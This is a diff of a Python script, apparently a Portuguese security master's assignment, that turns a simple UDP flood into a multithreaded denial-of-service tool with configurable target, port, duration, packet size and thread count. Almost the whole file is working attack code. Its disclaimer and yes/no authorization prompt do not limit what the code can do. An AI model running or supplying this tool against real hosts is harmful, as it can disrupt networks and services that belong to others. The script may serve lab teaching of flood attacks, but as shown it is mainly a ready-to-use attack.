@@ -1,33 +1,167 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 """
 Mestrado de Engenharia em Segurança Informatica
 Linguagens de Programação Dinamicas - UDP Flood
 
 Martinho Caeiro (23917)
 
-Este script envia pacotes UDP para múltiplos alvos em várias portas.
+Este script envia pacotes UDP para um alvo em várias portas (UDP Flood Attack).
+
+AVISO LEGAL:
+Este script é fornecido apenas para fins educacionais e de testes em laboratórios
+autorizados. O uso não autorizado pode violar leis aplicáveis. Use apenas em sistemas
+que tem autorização para testar.
 
 Uso:
-    python3 udp_flood.py <alvo> <porta>
+    python3 udp_flooder.py [--target HOST] [--port PORT] [--duration SECONDS] [--threads N]
 
 Exemplo:
-    python3 udp_flood.py alvo 1
+    python3 udp_flooder.py --target 192.168.1.1 --port 53 --duration 10
 """
+
 import socket
 import random
+import sys
+import argparse
 import time
+import threading
+from datetime import datetime
 
-#creates a socket
-sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
-bytes=random._urandom(65000) #creates packet
-ip=raw_input('Target IP:') #The IP we are attacking
-sent=0
+# =====================
+# UDP Flooder Functions
 
-##Infinitely loops sending packets to the port until the program is exited
-while 1:
- for i in range(1,65536):
- port=i
- sock.sendto(bytes,(ip,port))
- print("Sent %s amount of packets to %s at port %s" %(sent,ip,port))
- sent=sent+1
- time.sleep(0.10) # esperar 1/10 de segundo por cada pacote enviado
+def udp_flood_worker(target, port, packet_size, duration, packets_sent):
+    """Worker thread que envia pacotes UDP para um alvo."""
+    end_time = time.time() + duration
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    packet = random.randbytes(packet_size)
+
+    count = 0
+    try:
+        while time.time() < end_time:
+            sock.sendto(packet, (target, port))
+            count += 1
+            if count % 1000 == 0:
+                print(f"  {count:,} pacotes enviados para {target}:{port}")
+    except socket.error as e:
+        print(f"  Erro de socket: {e}")
+    except KeyboardInterrupt:
+        pass
+    finally:
+        sock.close()
+    
+    packets_sent.append(count)
+    return count
+
+
+def flood_target(target, port, packet_size, duration, num_threads):
+    """Envia UDP flood com múltiplas threads."""
+    print(f"\nIniciando UDP Flood")
+    print(f"   Alvo: {target}:{port}")
+    print(f"   Tamanho do pacote: {packet_size} bytes")
+    print(f"   Duração: {duration} segundos")
+    print(f"   Threads: {num_threads}")
+    print("-" * 60)
+
+    packets_sent = []
+    threads = []
+    t_start = time.time()
+
+    try:
+        # Criar threads
+        for i in range(num_threads):
+            t = threading.Thread(
+                target=udp_flood_worker,
+                args=(target, port, packet_size, duration, packets_sent)
+            )
+            t.daemon = True
+            t.start()
+            threads.append(t)
+
+        # Esperar pelas threads
+        for t in threads:
+            t.join()
+
+    except KeyboardInterrupt:
+        print("\nFlood interrompido pelo utilizador.")
+
+    duration_real = time.time() - t_start
+    total_packets = sum(packets_sent)
+    pps = total_packets / duration_real if duration_real > 0 else 0
+
+    print("\n" + "=" * 60)
+    print("RELATÓRIO - UDP FLOOD")
+    print("=" * 60)
+    print(f"Alvo: {target}:{port}")
+    print(f"Total de pacotes enviados: {total_packets:,}")
+    print(f"Taxa de envio: {pps:,.0f} pps (pacotes por segundo)")
+    print(f"Duração real: {duration_real:.2f}s")
+    print("=" * 60)
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="UDP Flooder - Ataque de negação de serviço (DoS) via UDP",
+        epilog="Apenas para fins educacionais em ambientes autorizados"
+    )
+    parser.add_argument("--target", "-t", help="Alvo (IP ou hostname)")
+    parser.add_argument("--port", "-p", type=int, default=53, help="Porta UDP (default: 53)")
+    parser.add_argument("--duration", "-d", type=int, default=10, help="Duração em segundos (default: 10)")
+    parser.add_argument("--packet-size", "-s", type=int, default=1472, help="Tamanho do pacote em bytes (default: 1472)")
+    parser.add_argument("--threads", "-n", type=int, default=4, help="Número de threads (default: 4)")
+
+    args = parser.parse_args()
+
+    # Se não foi fornecido alvo, fazer prompt
+    if not args.target:
+        args.target = input("Alvo (IP ou hostname): ").strip()
+        if not args.target:
+            print("Nenhum alvo fornecido. Abortando.")
+            sys.exit(1)
+
+    # Validações
+    if args.port < 1 or args.port > 65535:
+        print(f"Porta deve estar entre 1 e 65535")
+        sys.exit(1)
+
+    if args.duration < 1:
+        print(f"Duração deve ser pelo menos 1 segundo")
+        sys.exit(1)
+
+    if args.packet_size < 1 or args.packet_size > 65535:
+        print(f"Tamanho do pacote deve estar entre 1 e 65535 bytes")
+        sys.exit(1)
+
+    if args.threads < 1:
+        print(f"Número de threads deve ser pelo menos 1")
+        sys.exit(1)
+
+    # Confirmação de segurança
+    print("=" * 60)
+    print("AVISO - UDP FLOOD ATTACK")
+    print("=" * 60)
+    print(f"Está prestes a enviar um ataque DoS para: {args.target}:{args.port}")
+    print(f"Duração: {args.duration}s | Threads: {args.threads}")
+    print("Este ataque pode ser ILEGAL se não for autorizado.")
+    print("-" * 60)
+    
+    confirm = input("Confirma que tem autorização? (s/N): ").strip().lower()
+    if confirm != "s" and confirm != "yes":
+        print("Operação cancelada.")
+        sys.exit(0)
+
+    # Resolver hostname se necessário
+    try:
+        target_ip = socket.gethostbyname(args.target)
+        print(f"Alvo resolvido: {args.target} -> {target_ip}")
+    except socket.gaierror:
+        print(f"Não foi possível resolver {args.target}")
+        sys.exit(1)
+
+    # Executar flood
+    flood_target(target_ip, args.port, args.packet_size, args.duration, args.threads)
+
+
+if __name__ == "__main__":
+    main()
